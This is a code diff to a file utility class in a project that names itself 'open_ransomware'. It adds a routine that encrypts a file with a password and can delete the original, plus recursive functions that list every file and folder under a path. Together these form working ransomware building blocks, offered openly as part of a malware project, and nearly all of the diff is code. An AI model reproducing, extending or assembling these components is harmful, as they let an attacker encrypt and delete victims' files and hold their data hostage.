@@ -1,15 +1,116 @@
 package com.bechris100.open_ransomware.utils;
 
-import com.bechris100.open_ransomware.config.ConfigParser;
+import org.jetbrains.annotations.NotNull;
 
+import javax.crypto.Cipher;
+import javax.crypto.SecretKey;
+import javax.crypto.SecretKeyFactory;
+import javax.crypto.spec.PBEKeySpec;
+import javax.crypto.spec.PBEParameterSpec;
 import java.io.*;
 import java.nio.file.AccessDeniedException;
 import java.nio.file.FileAlreadyExistsException;
+import java.security.GeneralSecurityException;
 import java.util.ArrayList;
+import java.util.Arrays;
 import java.util.Collections;
 import java.util.List;
 
 public class FileUtil {
+
+    public static class Encryption {
+
+        // This class is directly sto- I mean copied from StackOverflow Page
+        // URL: https://stackoverflow.com/questions/13673556/using-password-based-encryption-on-a-file-in-java
+
+        private static final byte[] salt = {
+                (byte) 0x43, (byte) 0x76, (byte) 0x95, (byte) 0xc7,
+                (byte) 0x5b, (byte) 0xd7, (byte) 0x45, (byte) 0x17
+        };
+
+        private static @NotNull Cipher makeCipher(@NotNull String pass, boolean encryption) throws GeneralSecurityException {
+            PBEKeySpec keySpec = new PBEKeySpec(pass.toCharArray());
+            SecretKeyFactory keyFactory = SecretKeyFactory.getInstance("PBEWithMD5AndDES");
+            SecretKey secretKey = keyFactory.generateSecret(keySpec);
+            PBEParameterSpec pbeParamSpec = new PBEParameterSpec(salt, 42);
+
+            Cipher cipher = Cipher.getInstance("PBEWithMD5AndDES");
+
+            if (encryption)
+                cipher.init(Cipher.ENCRYPT_MODE, secretKey, pbeParamSpec);
+            else
+                cipher.init(Cipher.DECRYPT_MODE, secretKey, pbeParamSpec);
+
+            return cipher;
+        }
+
+        public static void encryptFile(File sourceFile, String pass, File encryptedFile, boolean deleteSource) throws IOException, GeneralSecurityException {
+            byte[] decData;
+            byte[] encData;
+
+            Cipher cipher = makeCipher(pass, true);
+
+            if (sourceFile == null)
+                throw new NullPointerException("Could not insert a source file to encrypt");
+
+            FileInputStream inStream = new FileInputStream(sourceFile);
+
+            int blockSize = 8;
+            int paddedCount = blockSize - ((int) sourceFile.length() % blockSize);
+            int padded = (int) sourceFile.length() + paddedCount;
+
+            decData = new byte[padded];
+
+            inStream.read(decData);
+            inStream.close();
+
+            for (int i = (int) sourceFile.length(); i < padded; ++i)
+                decData[i] = (byte) paddedCount;
+
+            encData = cipher.doFinal(decData);
+
+            if (encryptedFile == null)
+                throw new NullPointerException("Could not write encrypted data to a new/existing file");
+
+            FileOutputStream outStream = new FileOutputStream(encryptedFile);
+            outStream.write(encData);
+            outStream.close();
+
+            if (deleteSource)
+                FileUtil.delete(sourceFile.getPath());
+        }
+
+        public static void decryptFile(File sourceFile, String pass, File outputFile, boolean deleteSource) throws GeneralSecurityException, IOException {
+            byte[] encData;
+            byte[] decData;
+
+            if (sourceFile == null)
+                throw new NullPointerException("Could not establish a file for encryption");
+
+            Cipher cipher = makeCipher(pass, false);
+
+            FileInputStream inStream = new FileInputStream(sourceFile);
+            encData = new byte[(int) sourceFile.length()];
+            inStream.read(encData);
+            inStream.close();
+            decData = cipher.doFinal(encData);
+
+            int padCount = decData[decData.length - 1];
+            if (padCount >= 1 && padCount <= 8)
+                decData = Arrays.copyOfRange(decData, 0, decData.length - padCount);
+
+            if (outputFile == null)
+                throw new NullPointerException("Could not establish an output file for the encrypted file");
+
+            FileOutputStream target = new FileOutputStream(outputFile);
+            target.write(decData);
+            target.close();
+
+            if (deleteSource)
+                FileUtil.delete(sourceFile.getPath());
+        }
+
+    }
 
     public static boolean exists(String path) {
         return new File(path).exists();
@@ -31,7 +132,7 @@ public class FileUtil {
             throw new IOException("File at \"" + filePath + "\" could not be created");
     }
 
-    public static void createDirectory(String path) throws IOException {
+    public static void createDirectory(@NotNull String path) throws IOException {
         File dir = new File(path.substring(0, Utility.getLastPathSeparator(path, true)));
 
         if (dir.exists()) {
@@ -66,7 +167,7 @@ public class FileUtil {
         fos.close();
     }
 
-    public static char[] read(String filePath) throws IOException {
+    public static char @NotNull [] read(String filePath) throws IOException {
         File file = new File(filePath);
 
         if (!file.exists())
@@ -90,7 +191,7 @@ public class FileUtil {
         return str.toString().toCharArray();
     }
 
-    public static String removePath(String path) {
+    public static @NotNull String removePath(@NotNull String path) {
         return path.substring(Utility.getLastPathSeparator(path, false));
     }
 
@@ -121,7 +222,7 @@ public class FileUtil {
         return size;
     }
 
-    public static List<String> scanForSpecifiedName(String path, String name, boolean excludeAddingFolders) throws IOException {
+    public static @NotNull List<String> scanForSpecifiedName(String path, String name, boolean excludeAddingFolders) throws IOException {
         List<String> results = new ArrayList<>();
         File root = new File(path);
 
@@ -133,6 +234,8 @@ public class FileUtil {
         }
 
         List<String> data = listDirectory(path, true, false);
+        if (data.size() == 0)
+            return results;
 
         for (String item : data) {
             File file = new File(item);
@@ -147,6 +250,60 @@ public class FileUtil {
 
             if (file.isDirectory())
                 results.addAll(scanForSpecifiedName(item, name, excludeAddingFolders));
+        }
+
+        return results;
+    }
+
+    public static @NotNull List<String> scanDirs(String path) throws IOException {
+        List<String> results = new ArrayList<>();
+        File root = new File(path);
+
+        if (root.isFile())
+            return results;
+
+        List<String> data = listDirectory(path, true, false);
+        if (data.size() == 0)
+            return results;
+
+        for (String item : data) {
+            File file = new File(item);
+
+            if (!file.exists())
+                continue;
+
+            if (file.isDirectory()) {
+                results.add(item);
+                results.addAll(scanDirs(item));
+            }
+        }
+
+        return results;
+    }
+
+    public static @NotNull List<String> scanFiles(String path) throws IOException {
+        List<String> results = new ArrayList<>();
+        File root = new File(path);
+
+        if (root.isFile())
+            return results;
+
+        List<String> data = listDirectory(path, true, false);
+        if (data.size() == 0)
+            return results;
+
+        for (String item : data) {
+            File file = new File(item);
+
+            if (!file.exists())
+                continue;
+
+            if (file.isFile()) {
+                results.add(item);
+                continue;
+            }
+
+            results.addAll(scanFiles(item));
         }
 
         return results;
@@ -170,7 +327,7 @@ public class FileUtil {
         return file.isDirectory();
     }
 
-    public static List<String> listDirectory(String path, boolean sortNames, boolean removePaths) throws IOException {
+    public static @NotNull List<String> listDirectory(String path, boolean sortNames, boolean removePaths) throws IOException {
         List<String> data = new ArrayList<>();
         File fileData = new File(path);
 
